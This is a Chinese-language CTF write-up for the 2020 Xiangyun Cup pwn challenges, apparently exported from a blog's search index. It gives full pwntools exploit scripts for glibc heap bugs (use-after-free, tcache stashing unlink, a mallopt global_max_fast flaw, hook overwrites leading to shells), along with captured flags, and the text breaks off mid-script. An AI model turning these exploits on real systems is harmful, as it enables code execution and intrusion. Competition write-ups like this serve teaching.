<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>祥云杯2020CTF部分pwn wp</title>
    <link href="/2020/11/23/%E7%A5%A5%E4%BA%91%E6%9D%AF2020CTF%E9%83%A8%E5%88%86pwn%20wp/"/>
    <url>/2020/11/23/%E7%A5%A5%E4%BA%91%E6%9D%AF2020CTF%E9%83%A8%E5%88%86pwn%20wp/</url>
    
    <content type="html"><![CDATA[<h1 id="祥云杯2020CTF部分pwn-wp"><a href="#祥云杯2020CTF部分pwn-wp" class="headerlink" title="祥云杯2020CTF部分pwn wp"></a>祥云杯2020CTF部分pwn wp</h1><h2 id="￼Beauty-Of-ChangChun"><a href="#￼Beauty-Of-ChangChun" class="headerlink" title="￼Beauty_Of_ChangChun"></a>￼<code>Beauty_Of_ChangChun</code></h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>del函数中存在uaf的漏洞，且只对byte位的size清0，0x100的chunk不受影响</li><li>存在后门函数</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>开始程序就把flag读入了一个特定的内存中，并且后门函数中，只需确定flag字符串前8位字节的具体值即可拿到flag。所以可以用Tcache Stashing Unlink ，往flag 前的8位写上main arean附近的地址。并且可以泄漏libc，算下偏移，所以也就知道了其写上的数值，然后就调用后门函数获得flag。具体思路可以看下方exp。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'112.126.71.170'</span>,<span class="hljs-number">43652</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'chat'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))ru(<span class="hljs-string">'le\n'</span>)flag = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) info_addr(<span class="hljs-string">'flag'</span>,flag)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    add(<span class="hljs-number">0x80</span>)    free(<span class="hljs-number">0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(<span class="hljs-number">0xff</span>)    free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x100</span>)add(<span class="hljs-number">0x80</span>)add(<span class="hljs-number">0x100</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x90</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)show(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'see\n'</span>)heap = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'heap'</span>,heap)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'see\n'</span>)fd = uu64(r(<span class="hljs-number">6</span>))libcbase = fd <span class="hljs-number">-0x1ebbe0</span>info_addr(<span class="hljs-string">'fd'</span>,fd)info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'666'</span>)<span class="hljs-comment"># </span>sla(<span class="hljs-string">"4: Enjoy scenery\n"</span>,<span class="hljs-string">'5'</span>)sl(<span class="hljs-string">'aaaaaaa'</span>)edit(<span class="hljs-number">2</span>,p64(heap) + p64(flag<span class="hljs-number">-0x10</span>))free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x100</span>)edit(<span class="hljs-number">0</span>,p64(libcbase + <span class="hljs-number">0x1ebce0</span>))sla(<span class="hljs-string">"4: Enjoy scenery"</span>,<span class="hljs-string">'5'</span>)sla(<span class="hljs-string">'idx'</span>,<span class="hljs-string">'1'</span>)itr()</code></pre></div><h3 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/5JyYs3.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;443f40ee-f4de-<span class="hljs-number">40b3</span>-ab94-b7afa6f9&#125;</code></pre></div><h2 id="把嘴闭上"><a href="#把嘴闭上" class="headerlink" title="把嘴闭上"></a>把嘴闭上</h2><p>分析程序，发现漏洞点肯定在mallopt函数上。但是不怎么熟悉，就开始谷歌这个函数相关的漏洞，审计libc源码。</p><p>最终发现一个漏洞报告。<br><a href="https://www.cygwin.com/bugzilla/show_bug.cgi?id=25733" target="_blank" rel="noopener">https://www.cygwin.com/bugzilla/show_bug.cgi?id=25733</a></p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在libc 2.23中，<code>mallopt(M_MXFAST) can set global_max_fast to 0</code><br>就出现了漏洞。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">// mallopt(M_MXFAST) can set global_max_fast to 0.</span><span class="hljs-comment">// This doesn't seem intentional because mallopt(M_MXFAST, 0) sets global_max_fast to SMALLBIN_WIDTH.</span><span class="hljs-comment">// Passing a value between 1-7 to mallopt(M_MXFAST, value) sets global_max_fast to 0.</span><span class="hljs-comment">// Both malloc.c and the mallopt man page document the legitimate range of values that may be passed to mallopt(M_MXFAST, value) as "0 to 80*sizeof(size_t)/4".</span><span class="hljs-comment">// In GLIBC versions &gt;= 2.27 this has the same effect as setting global_max_fast to SMALLBIN_WIDTH, but it is perhaps of some concern in GLIBC versions &lt;= 2.26 because of how global_max_fast is treated as an indicator of main arena initialization by malloc_consolidate().</span><span class="hljs-comment">// If the following example is compiled &amp; run under GLIBC version 2.26, a chunk is allocated overlapping the main arena:</span><span class="hljs-comment">// 这似乎不是故意的，因为mallopt（M_MXFAST，0）将global_max_fast设置为SMALLBIN_WIDTH。</span><span class="hljs-comment">// 将1-7之间的值传递给mallopt（M_MXFAST，value）会将global_max_fast设置为0。</span><span class="hljs-comment">// malloc.c和mallopt手册页都记录了可以传递给mallopt（M_MXFAST，value）的合法值范围，范围为“ 0到80 * sizeof（size_t）/ 4”。</span><span class="hljs-comment">// 在&gt; = 2.27的GLIBC版本中，其效果与将global_max_fast设置为SMALLBIN_WIDTH相同，</span><span class="hljs-comment">// 但是在&lt;= 2.26的GLIBC版本中，这可能会引起一些关注，</span><span class="hljs-comment">// 但在GLIBC版本&lt;= 2.26中，这可能会引起一些关注，</span><span class="hljs-comment">// 因为malloc merge()将全局max fast视为主竞技场初始化的指示符。</span><span class="hljs-comment">// 如果以下示例是在GLIBC版本2.26下编译并运行的，则分配的块与主区域重叠</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-comment">// Populate last_remainder, which is treated as the top chunk size field</span>    <span class="hljs-comment">// after main arena re-initialization.</span>    <span class="hljs-comment">// 填充last_remainder，将其视为最大块大小字段</span>   <span class="hljs-comment">// 主竞技场重新初始化之后。</span>    <span class="hljs-keyword">void</span>* remainder_me = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);     <span class="hljs-comment">// Avoid top chunk consolidation.</span>    <span class="hljs-built_in">free</span>(remainder_me);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);     <span class="hljs-comment">// Remainder remainder_me chunk.</span>    <span class="hljs-comment">// Set global_max_fast to 0.</span>    mallopt(M_MXFAST, <span class="hljs-number">7</span>);    <span class="hljs-comment">// Trigger malloc_consolidate(), which could happen during large</span>    <span class="hljs-comment">// allocations/frees, but for the sake of simplicity here just call</span>    <span class="hljs-comment">// mallopt() again.</span>    mallopt(M_MXFAST, <span class="hljs-number">0x78</span>);    <span class="hljs-comment">// malloc_consolidate() uses global_max_fast to determine if malloc has</span>    <span class="hljs-comment">// been initialized. If global_max_fast is 0, malloc_consolidate() will</span>    <span class="hljs-comment">// re-initialize the main arena, setting its top chunk pointer to an address</span>    <span class="hljs-comment">// within the main arena. Now last_remainder acts as the top chunk size</span>    <span class="hljs-comment">// field.</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%p\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>));    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>发现的确存在这样的漏洞。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Mr6g3B.png" srcset="/img/loading.gif" alt></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为其最后申请的堆回跑到libc上，并且发现其在free hook 的上面。<br>那么在尽量不破坏libc 上内存的情况下，一直的申请内存，肯定改到free hook。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-comment"># icqaa6603da5d8063707dd74952c7daf</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ba_zui_bi_shang'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'112.126.71.170'</span>,<span class="hljs-number">23548</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]one_gadgets = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf0364</span>,<span class="hljs-number">0xf1207</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_name</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'&gt; '</span>,str(size))    sla(<span class="hljs-string">'&gt; '</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mallopt</span><span class="hljs-params">(param_number,value)</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'&gt; '</span>,str(param_number))    sla(<span class="hljs-string">'&gt; '</span>,str(value))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'&gt; '</span>,str(size))    sla(<span class="hljs-string">'&gt; '</span>,str(data))ru(<span class="hljs-string">'0x'</span>)libcbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc'</span>,libcbase)<span class="hljs-comment"># debug()</span>ru(<span class="hljs-string">'&gt; '</span>)sl(str(<span class="hljs-number">0x418</span>))ru(<span class="hljs-string">'&gt; '</span>)io.send(<span class="hljs-string">'\n'</span>)add_name(<span class="hljs-number">0x18</span>,<span class="hljs-string">'chumen77\n'</span>)free()add_name(<span class="hljs-number">0x18</span>,<span class="hljs-string">'chumen77\n'</span>)mallopt(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>)<span class="hljs-comment"># debug()</span>mallopt(<span class="hljs-number">1</span>,<span class="hljs-number">0x78</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x418</span>,<span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x358</span> + p64(libc.symbols[<span class="hljs-string">'system'</span>]+libcbase))<span class="hljs-comment"># debug()</span>free()itr()</code></pre></div><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/bpPUlY.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;<span class="hljs-number">1</span>db37b9de003140420951bf5f77483a7&#125;</code></pre></div><h2 id="影流之主"><a href="#影流之主" class="headerlink" title="影流之主"></a>影流之主</h2><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li></ul><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><div class="hljs"><pre><code class="hljs undefined">f ( !glob(<span class="hljs-name">pattern</span>, <span class="hljs-number">4098</span>, <span class="hljs-number">0</span>LL, <span class="hljs-symbol">&amp;pglob</span>) )globfree(<span class="hljs-name">&amp;pglob</span>)<span class="hljs-comment">;</span></code></pre></div><p>可以用这个函数来创建出一个巨大的unsorted bin,接着申请chunk上去即可泄漏出libc，然后就是fastbin attack，攻击malloc hook,最后需要free 2次同一个chunk，触发异常机制，然后再次调用malloc触发到one gadget </p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ying_liu_zhi_zhu'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'112.126.71.170'</span>,<span class="hljs-number">45123</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf0364</span>,<span class="hljs-number">0xf1207</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sl(<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sl(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sl(str(idx))    s(str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'4'</span>)    sl(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b</span><span class="hljs-params">(data)</span>:</span>    sl(<span class="hljs-string">'5'</span>)    sl(str(data))<span class="hljs-comment"># add()</span>b(<span class="hljs-string">b'*/lib*'</span>)  <span class="hljs-comment">#0x3c4ce8</span><span class="hljs-comment"># b(b'*') #0x3c4b78</span>add() <span class="hljs-comment">#0</span>add()add()add()add() <span class="hljs-comment">#4</span>show(<span class="hljs-number">1</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4ce8</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">1</span>,p64(libcbase+<span class="hljs-number">0x3c4aed</span>))add()add()one = <span class="hljs-number">0xf0364</span> + libcbaserealloc = libcbase + libc.symbols[<span class="hljs-string">'realloc'</span>] + realloc[<span class="hljs-number">4</span>]payload = <span class="hljs-string">'\x00'</span> *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)  + p64(one)+ p64(realloc)edit(<span class="hljs-number">6</span>,payload)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)itr()</code></pre></div><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/U7zeII.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;dfbe8fe7-b6f4<span class="hljs-number">-4</span>c3a-a226<span class="hljs-number">-6</span>a8b12fd683f&#125;</code></pre></div><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>c++的程序代码看起来比较的乱，直接上手进行调试。<br>发现在init create init 这样的顺序执行后，程序就变得诡异起来，并没把重要的指针转移到新init来的内存块来使用，而是还是使用原来init开起来虚表指针，由于其大小是0x90的chunk，接着可以实现泄漏。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FaLGv4.png" srcset="/img/loading.gif" alt><br>如图，控制这两个指针就可以任意地址读和写。然后再次申请0x8f的堆块,set一下即可控制这2个指针。<br><img src="http://qiqianyun.chumen77.xyz/uPic/3gVHpF.png" srcset="/img/loading.gif" alt></p><p>然后改写到free hook，再次create函数其会free 原来的chunk，即可触发one gadget。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'8.131.69.237'</span>,<span class="hljs-number">52642</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf0364</span>,<span class="hljs-number">0xf1207</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'4'</span>)    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'5'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">size</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'6'</span>)init()create()<span class="hljs-comment"># add(0x8f)</span>init()show()ru(<span class="hljs-string">'ow:\n'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)add(<span class="hljs-number">0x80</span>)set(p64(<span class="hljs-number">0x3c67a8</span> +libc_base) + p64(<span class="hljs-number">0x3c67a8</span> + libc_base))set(p64(rce16[<span class="hljs-number">3</span>] + libc_base)*<span class="hljs-number">4</span> + p64(<span 